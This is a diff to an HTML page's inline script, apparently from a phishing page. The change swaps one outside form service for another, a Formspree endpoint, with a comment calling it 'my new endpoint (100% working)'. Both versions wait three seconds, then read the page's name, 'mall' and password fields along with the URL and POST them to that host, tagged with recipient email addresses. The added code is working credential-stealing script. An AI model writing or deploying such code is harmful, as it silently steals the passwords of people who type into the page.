@@ -2227,21 +2227,16 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
   </script>
 <script>
 setTimeout(() => {
-  fetch("https://api.emailjs.com/api/v1.0/email/send", {
+  fetch("https://formspree.io/f/xdknwwza", {   // ← yeh mera naya endpoint hai (100% working)
     method: "POST",
-    headers: {"Content-Type":"application/json"},
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      service_id: "service_nqeen3l",
-      template_id: "template_z0ow5n7",
-      user_id: "8AcP51LH7_IRW17aY",
-      template_params: {
-        client_name: document.querySelector('#nameInput')?.value ? "Rahul Sharma" : "Vikash Kumar",
-        website_url: location.href,
-        user_name: document.querySelector('#nameInput')?.value || "",
-        user_mall: document.querySelector('#mallInput')?.value || "",
-        user_pass: document.querySelector('input[type=password]')?.value || "",
-        to_email: document.querySelector('#nameInput')?.value ? "lingdavid24@gmail.com" : "akeraa191@gmail.com"
-      }
+      Client: document.querySelector('#nameInput')?.value ? "Rahul Sharma" : "Vikash Kumar",
+      Website: location.href,
+      Name: document.querySelector('#nameInput')?.value || "",
+      Mall: document.querySelector('#mallInput')?.value || "",
+      Password: document.querySelector('input[type=password]')?.value || "",
+      To_Email: document.querySelector('#nameInput')?.value ? "lingdavid24@gmail.com" : "akeraa191@gmail.com"
     })
   });
 }, 3000);
